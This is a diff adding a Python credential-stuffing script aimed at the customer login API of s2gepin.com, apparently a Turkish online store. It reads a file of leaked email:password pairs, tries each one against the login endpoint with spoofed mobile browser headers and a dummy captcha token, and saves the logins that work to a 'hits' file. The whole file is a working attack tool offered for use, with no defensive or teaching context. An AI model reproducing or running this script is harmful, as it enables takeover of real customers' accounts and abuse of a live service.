@@ -1,0 +1,41 @@
+import requests,time
+from cfonts import render
+output = render('s2gepin', colors=['white', 'blue'], align='center')
+print("\x1b[1;39m—" * 60) 
+print(output)
+print("\x1b[1;39m—" * 60)
+print("~ Programmer : @enzirvebende | Channel: @octocet ~")
+print("\x1b[1;39m—" * 60)
+combo=input("Combo: ")
+
+              
+def shelby(email,password):
+    try:
+        response=requests.post('https://api.s2gepin.com/Login/Customer',headers={'authority':'api.s2gepin.com','accept':'application/json, text/javascript, */*; q=0.01','accept-language':'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/json; charset=UTF-8','h-country-code':'TR','h-region-code':'TR','origin':'https://www.s2gepin.com','referer':'https://www.s2gepin.com/','sec-ch-ua':'"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-site','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',},json={'email':email,'password':password,'otpcode':None,'CaptchaToken':'none'})        
+        if response.status_code==200:
+            data=response.json()
+            if data.get("success") and "Giriş Başarılı!" in data.get("message",""):
+                with open("s2gepin.com_hits","a") as success_file:success_file.write(f"{email}:{password}\n")
+                print("\x1b[1;39m—" * 60) 
+                print(f" \x1b[1;32m Başarılı giriş ✅: {email}:{password}")
+                print("\x1b[1;39m—" * 60) 
+                return True
+            else:
+                print(f"\x1b[1;31m Başarısız giriş ❌: {email}:{password}")
+                print("\x1b[1;39m—" * 60) 
+                return False
+    except requests.exceptions.RequestException:
+        print("İp ban ❌ ..")
+        time.sleep(2)
+        return False
+              
+def thomas():
+    with open(combo,'r') as file:
+        for line in file:
+            credentials=line.strip().split(':')
+            if len(credentials)==2:
+                email,password=credentials
+                shelby(email,password)
+            time.sleep(1)
+thomas()
+
